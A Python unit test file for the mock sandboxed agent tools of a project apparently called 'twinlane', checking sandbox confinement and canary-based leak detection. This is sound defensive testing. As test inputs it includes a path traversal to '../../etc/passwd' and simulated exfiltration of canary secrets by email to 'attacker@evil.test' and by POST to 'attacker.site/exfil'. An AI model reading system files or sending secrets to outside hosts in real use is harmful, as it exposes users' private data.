"""Unit tests for mock sandboxed tools and canary leak detection."""

from pathlib import Path

from twinlane.agents.tools.base import ToolRegistry
from twinlane.agents.tools.fetch_url import FetchUrlTool
from twinlane.agents.tools.http_post import HttpPostTool
from twinlane.agents.tools.read_file import ReadFileTool
from twinlane.agents.tools.send_email import SendEmailTool


def test_read_file_tool(tmp_path: Path) -> None:
    """Test read_file tool with sandbox confinement and path traversal prevention."""
    sandbox = tmp_path / "sandbox"
    tool = ReadFileTool(sandbox_root=sandbox)

    # 1. Write fixture and read
    secret_path = tool.write_fixture("docs/secret.txt", "CANARY-7f3a9b1c-data")
    assert secret_path.exists()

    res = tool.execute(path="docs/secret.txt")
    assert res.success is True
    assert res.data == "CANARY-7f3a9b1c-data"

    # 2. File not found
    res_missing = tool.execute(path="docs/missing.txt")
    assert res_missing.success is False
    assert "File not found" in (res_missing.error or "")

    # 3. Path traversal outside sandbox rejected
    res_escape = tool.execute(path="../../etc/passwd")
    assert res_escape.success is False
    assert "escapes sandbox root" in (res_escape.error or "")


def test_send_email_tool(tmp_path: Path) -> None:
    """Test safe send_email mock and canary leak detection."""
    outbox = tmp_path / "outbox"
    tool = SendEmailTool(outbox_dir=outbox)
    canary = "CANARY-test-token-12345"

    assert tool.contains_canary(canary) is False

    # Send clean email
    tool.execute(recipient="safe@corp.local", subject="Meeting", body="Let's meet at 2pm.")
    assert tool.contains_canary(canary) is False

    # Send email containing canary
    tool.execute(recipient="attacker@evil.test", subject="Leaked", body=f"The key is {canary}")
    assert tool.contains_canary(canary) is True

    # Verify file written to local outbox
    files = list(outbox.glob("*.txt"))
    assert len(files) == 2

    tool.clear()
    assert len(tool.sent_messages) == 0


def test_http_post_tool(tmp_path: Path) -> None:
    """Test safe http_post mock and canary leak detection."""
    outbox = tmp_path / "http_outbox"
    tool = HttpPostTool(outbox_dir=outbox)
    canary = "CANARY-http-secret"

    assert tool.contains_canary(canary) is False

    # Clean POST
    tool.execute(url="https://api.internal/v1/ping", data={"status": "ok"})
    assert tool.contains_canary(canary) is False

    # POST with canary in payload
    tool.execute(url="https://attacker.site/exfil", data={"secret": canary})
    assert tool.contains_canary(canary) is True
    assert len(tool.posted_requests) == 2


def test_fetch_url_tool(tmp_path: Path) -> None:
    """Test fetch_url tool with canned pages and fixtures."""
    fixture_dir = tmp_path / "fixtures"
    fixture_dir.mkdir()
    page_file = fixture_dir / "about.html"
    page_file.write_text("<h1>About Company</h1>", encoding="utf-8")

    tool = FetchUrlTool(
        canned_pages={"https://docs.local/api": "API Documentation"},
        fixture_dir=fixture_dir,
    )

    # 1. Canned page
    res1 = tool.execute(url="https://docs.local/api")
    assert res1.success is True
    assert res1.data == "API Documentation"

    # 2. Fixture file lookup
    res2 = tool.execute(url="https://company.local/about.html")
    assert res2.success is True
    assert "<h1>About Company</h1>" in str(res2.data)

    # 3. Not found
    res3 = tool.execute(url="https://missing.local/none.html")
    assert res3.success is False
    assert "Mock 404" in (res3.error or "")


def test_tool_registry() -> None:
    """Test tool registration and execution lookup."""
    registry = ToolRegistry()
    email_tool = SendEmailTool()
    registry.register(email_tool)

    assert registry.list_tools() == ["send_email"]
    assert registry.get("send_email") == email_tool

    # Successful execution
    res = registry.execute("send_email", recipient="bob@test.local", subject="Hi")
    assert res.success is True

    # Unknown tool
    res_unknown = registry.execute("unknown_tool")
    assert res_unknown.success is False
    assert "not found in registry" in (res_unknown.error or "")
